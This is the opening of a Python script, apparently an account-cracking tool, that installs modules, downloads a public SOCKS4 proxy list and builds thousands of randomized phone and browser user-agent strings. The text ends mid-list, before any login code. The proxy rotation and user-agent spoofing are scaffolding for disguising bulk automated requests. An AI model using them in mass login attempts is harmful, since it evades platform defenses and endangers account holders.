#------------------[ IMPORT MODULE ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as typoennnXD 
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
#------------------[  MODULE  ]-------------------#
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')
	
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
wa=sol()
ses=requests.Session()
princp=[]
xxnx=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mTypo Z')
prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):
	rr = random.randint; rc = random.choice
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	t=random.randrange(0,10525)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	crot=random.choice(['Win64; x64','WOW64'])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	aseph=f'Mozilla/5.0 (Windows NT 10.0; {crot} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Safari/537.36 Edge/12.{t}'
	hi=f'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36{model}'
	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5,aseph,hi])
	ugen.append(uaku2)
	
	###---[ USER AGENT ]---###
for agenku in range(1000):
	 rr,rc=random.randint,random.choice
	 h=random.randrange(11,19)
	 b = str(rc(['AH9910','X52X','6025D','Mi A3','Nokia G50','PCHM30','SM-G955F','CPH1871','MI CC 9 Meitu Edition','PDCM00','Nokia X5','SM-N981B','SM-G8870','X526','SM-A022M','moto e6s','CPH2061','Primo H9','2106118C','Mi MIX 3 5G','CITI 653 4G CS6062ML','CP3667AT']))
	 c = str(rc(['PPR1','PQ3A','RP1A','RKQ1','QKQ1','QQ3A','QP1A','QD4A','POBS29','SKQ1','RD1A']))
	 d = (f"{str(rr(100000,1000000))}.{str(rr(0,200))}")
	 az1 = str(rc(['PPR1','QTT5', 'QKQ1','OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1']))
	 az2 = (f"{str(rr(111111,299999))}")
	 az3 = str(rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020']))
	 kombinasi_build = (f"{az1}.{az2}.{az3}")
	 modelnya = str(rc(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B',
     'GT-S812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750',
	 "X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811",
	 "RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921",
	 "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG",
	 "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC",
	 "CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979",
     "V2030", "V2029", "vivo 2018", "vivo 2007", "vivo 1915", "vivo 1906", "vivo 1938", "vivo 1901", "V2166BA", "V2185A", "vivo 1935", "V2040", "vivo 1920", "V2054A", "V2027", "V2068", "V2149", "V2055", "V2230A", "V2158", "V2116", "V2020A", "V2061", "vivo 1940", "V2130", "V2033", "vivo X21A", "V1981A", "V2244A", "V2109", "vivo 1909", "V2153", "vivo 1933", "V2036", "V2207", "V2202", "V2104", "V2201", "V1963A", "V2205", "vivo 2004", "V2070", "V2142", "V2111", "vivo X9"]))
	 samsung_sm = str(rc(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B",
	 "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U",
	 "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", 